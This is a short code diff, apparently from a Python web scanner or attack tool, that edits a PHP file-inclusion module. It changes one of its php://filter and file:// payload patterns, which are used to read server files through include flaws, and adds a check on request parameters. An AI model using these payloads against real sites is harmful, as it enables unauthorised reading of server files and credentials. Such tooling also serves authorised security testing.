@@ -16,7 +16,7 @@ patterns = [
         "{}",
         "php://filter/read=convert.base64-encode/resource={}",
         "php://filter/write=string.rot13/resource={}",
-        "php://filter/write=string.strip_tags|convert.base64-decode/resource={}",
+        "php://filter/write=string.strip_tags|convert.base64-encode/resource={}",
         "file://{}",
     ]
     for dirpattern in [
@@ -71,6 +71,13 @@ class PHPIncludeCrackMod(Mod):
 
     async def check(self, thing):
         if not isinstance(thing, VulunableParam):
+            return 0
+        params = (
+            thing.frompage.params
+            if thing.httpmethod == "GET"
+            else thing.frompage.data
+        )
+        if params is None:
             return 0
         return 1
 
